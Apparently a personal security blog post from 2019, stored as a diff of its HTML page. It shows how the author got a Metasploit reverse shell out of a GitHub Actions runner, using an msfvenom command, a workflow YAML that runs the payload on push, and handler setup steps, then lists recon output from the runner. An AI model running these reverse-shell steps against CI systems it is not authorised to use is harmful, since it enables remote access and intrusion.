@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Shells in Github Actions</title>
+	
+	<meta name="author" content="raesene">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
+	<link href="/assets/css/style.css" rel="stylesheet">
+
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
+</head>
+
+<body>
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="https://github.com/raesene">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="https://twitter.com/raesene">
+				<i class="fa fa-twitter"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:raesene@gmail.com">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="/">
+				<img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036?s=35" class="img-circle" />
+				
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="/">Home</a></li>
+				<li><a href="/categories/index.html">Categories</a></li>
+				<li><a href="/tags/index.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button>
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
+			<li><a href="/categories/index.html"><i class="fa fa-folder"></i>Categories</a></li>
+			<li><a href="/tags/index.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs">
+		<!-- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="/">
+		<img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036?s=150" class="img-circle" />
+	</a>
+	<h3 class="title">
+        <a href="/"></a>
+    </h3>
+</header>
+
+
+<div id="bio" class="text-center">
+	Security Geek, Penetration Testing, Docker, Ruby, Hillwalking
+</div>
+
+
+<div id="contact-list" class="text-center">
+	<ul class="list-unstyled list-inline">
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://github.com/raesene">
+				<i class="fa fa-github-alt fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://twitter.com/raesene">
+				<i class="fa fa-twitter fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="mailto:raesene@gmail.com">
+				<i class="fa fa-envelope fa-lg"></i>
+			</a>
+		</li>
+		
+	</ul>
+	<ul id="contact-list-secondary" class="list-unstyled list-inline">
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/rorym">
+				<i class="fa fa-linkedin fa-lg"></i>
+			</a>
+		</li>
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="/feed.xml">
+				<i class="fa fa-rss fa-lg"></i>
+			</a>
+		</li>
+	</ul>
+</div>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>Shells in Github Actions </h1>
+</div>
+	
+<article>
+
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   August 
+	   25th,
+	   
+	   2019
+	 </span>
+	  <div class="article_body">
+	  <p>I recently got my beta invite to the awesome <a href="https://github.com/features/actions">Github Actions</a> feature.  This is a free to use CI/CD system.  If you’re not familiar with CI/CD, you can think of it as a system which runs a series of actions during your development process to help test/maintain/deploy it.  For example you could use CI to run your test suite on every commit, so you know if someone just broke the build.</p>
+
+<p>To do this we use “runners” which are essentially execution environments (e.g. a Virtual Machine) that runs our tests or other actions.</p>
+
+<p>Of course what do pentesters thing, seeing the idea that someone’s going to let me execute commands somewhere… “hey can I get a shell on that?” :)</p>
+
+<p><a href="https://twitter.com/antitree/status/1164193020612423680?s=20">Antitree got there first on twitter</a> but I thought it could be fun to walk through the process in a little more detail than twitter’s format allows.</p>
+
+<p>The pre-requisite for this is that your Github account has actions enabled.  Once you’ve got that here’s a set of steps to get a shell on one of Github’s runners.</p>
+
+<p>It’s worth noting that what we’re detailing below isn’t likely any kind of security issue for Github, I’d expect that they’re providing dedicated ephemeral instances as CI runners, so you’re not likely to get access to anyone else’s infrastructure using this technique, it’s just a bit of fun :)</p>
+
+<p>One thing to note though in general for CI/CD environments is how important isolation is, if you’re running untrusted code in pipelines.  As we’ll show here, it’s pretty easy to get a shell back out of a runner, so don’t run these in a network with other important hosts…</p>
+
+<h3 id="prepare-the-payload">Prepare the payload</h3>
+
+<p>Just like in the previous post on <a href="https://raesene.github.io/blog/2019/08/10/making-it-rain-shells-in-Kubernetes/">Kubernetes shells</a> we’re going to use <a href="https://www.metasploit.com/">Metasploit</a> for this.  So we need a reverse shell payload that we can call back to.  For this, you’ll need to have the port receiving the connection visible on the Internet with no firewall in the way, you could use something like a Digital Ocean droplet or EC2 instance for this.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p linux/x64/meterpreter_reverse_http LHOST=YOURIP LPORT=YOURPORT -f elf &gt; reverse_shell.elf
+</code></pre></div></div>
+
+<p>just replace <code class="highlighter-rouge">YOURIP</code> and <code class="highlighter-rouge">YOURPORT</code> with your information.</p>
+
+<p>Now we’ve got a shell program, just start a new Github repository and add the shell to the repo.</p>
+
+<h3 id="our-gtihub-action">Our Gtihub Action</h3>
+
+<p>We just need to create our action now that will get triggered when we push changes to our Github repository.  Github actions live in <code class="highlighter-rouge">.github/workflows/</code> and are in YAML format.  Create a file called <code class="highlighter-rouge">testaction.yml</code> in there and you can put something like this into the file.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>name: Shell
+
+on: [push]
+
+jobs:
+
+  build:
+ 
+    runs-on: ubuntu-latest
+ 
+    steps:
+    - uses: actions/checkout@v1
+    - name: metasploit reverse shell
+      run: ./reverse_shell.elf
+</code></pre></div></div>
+
+<p>Now when we commit our repository, Github should run our action.  Before we do that make sure to set-up Metasploit to receive the connection.</p>
+
+<h3 id="metasploit-handler">Metasploit handler</h3>
+
+<p>after running <code class="highlighter-rouge">msfconsole</code> you can do the following steps</p>
+
+<ol>
+  <li><code class="highlighter-rouge">use exploit/multi/handler</code></li>
+  <li><code class="highlighter-rouge">set payload linux/x64/meterpreter_reverse_http</code></li>
+  <li><code class="highlighter-rouge">set LHOST YOURIP</code></li>
+  <li><code class="highlighter-rouge">set LPORT YOURPORT</code></li>
+  <li><code class="highlighter-rouge">exploit</code></li>
+</ol>
+
+<p>Then push your shell and action code to Github to trigger the action, and all being well you should get a shell :)</p>
+
+<h3 id="looking-around-a-github-runner">Looking around a Github runner</h3>
+
+<p>So once you’ve got your shell what can you see? Well it’s running an Ubuntu based distro, as we’d expect (it is possible to get Windows or indeed Mac runners, so you could repeat this exercise with them)</p>
+
+<p><strong>“Privesc”</strong></p>
+
+<p>When you first get the shell, you’re running as the <code class="highlighter-rouge">runner</code> user but it’s got passwordless <code class="highlighter-rouge">sudo</code> access, so you can just <code class="highlighter-rouge">sudo bash</code> to get <code class="highlighter-rouge">root</code>.</p>
+
+<p><strong>Listening ports</strong></p>
+
+<p>Running <code class="highlighter-rouge">ss -ltnp</code> will show us the listening TCP ports</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
+LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       
+LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
+LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
+LISTEN   0         128                    [::]:22                  [::]:*  
+</code></pre></div></div>
+
+<p>The port <code class="highlighter-rouge">3306/TCP</code> is kind of interesting, as my action didn’t make any use of MySQL.</p>
+
+<p><strong>Routing Table</strong></p>
+
+<p>Nothing hugely interesting on the routing table, although interesting that <code class="highlighter-rouge">docker0</code> is there, so we’re running Docker on the runner host.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+0.0.0.0         10.1.0.1        0.0.0.0         UG    100    0        0 eth0
+10.1.0.0        0.0.0.0         255.255.0.0     U     0      0        0 eth0
+168.63.129.16   10.1.0.1        255.255.255.255 UGH   100    0        0 eth0
+169.254.169.254 10.1.0.1        255.255.255.255 UGH   100    0        0 eth0
+172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0
+</code></pre></div></div>
+
+<p><strong>Running Processes</strong></p>
+
+<p>One thing I thought was interesting, although not really surprising, is that there are quite a few dotnet core processes running on the host.</p>
+
+<p><strong>Users on the host</strong></p>
+
+<p>A quick look at <code class="highlighter-rouge">/etc/passwd</code> shows up a couple of non-standard users</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pollinate:x:110:1::/var/cache/pollinate:/bin/false
+mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
+sphinxsearch:x:112:117:Sphinx fulltext search service,,,:/var/run/sphinxsearch:/usr/sbin/nologin
+runneradmin:x:1000:1000:Ubuntu:/home/runneradmin:/bin/bash
+runner:x:1001:115:,,,:/home/runner:/bin/bash
+</code></pre></div></div>
+
+<h3 id="conclusion">Conclusion</h3>
+
+<p>This is just a quick exploration of a Github Actions runner host, showing some of the techniques that can be used to get shells in CI systems, if you have the ability to submit commands to them.</p>
+
+<p>Overall Github actions looks really cool, and I’m looking forward to integrating it into a lot of my repo’s alongside their private repository feature.</p>
+
+	  </div>
+
+		
+		<ul class="tag_box list-unstyled list-inline">
+		  <li><i class="fa fa-folder-open"></i></li>
+		  
+		  
+			 
+				<li><a href="/categories/index.html#Github-ref">
+					Github <span>(1)</span>
+					
+				</a></li>
+			
+		  
+		</ul>
+		  
+
+		  
+
+		<hr>
+
+		<div>
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="https://twitter.com/share?text=Shells in Github Actions&via=raesene"
+           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
+           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus"
+           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+
+      <section class="col-sm-6 author">
+        <img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036" class="img-rounded author-image" />
+        <h4 class="section-title author-name">raesene</h4>
+        <p class="author-bio">Security Geek, Penetration Testing, Docker, Ruby, Hillwalking</p>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous"><a href="/blog/2019/08/10/making-it-rain-shells-in-Kubernetes/" title="Making it Rain shells in Kubernetes">&larr; Previous</a></li>
+		  
+		  
+			<li class="next disabled"><a>Next &rarr;</a>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+
+
+		<footer>
+			<hr/>
+			<p>
+				&copy; 2019 raesene with Jekyll. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+			</p>
+		</footer>
+	</div>
+
+	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
+	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="/assets/js/app.js"></script>
+</body>
+</html>
+
+
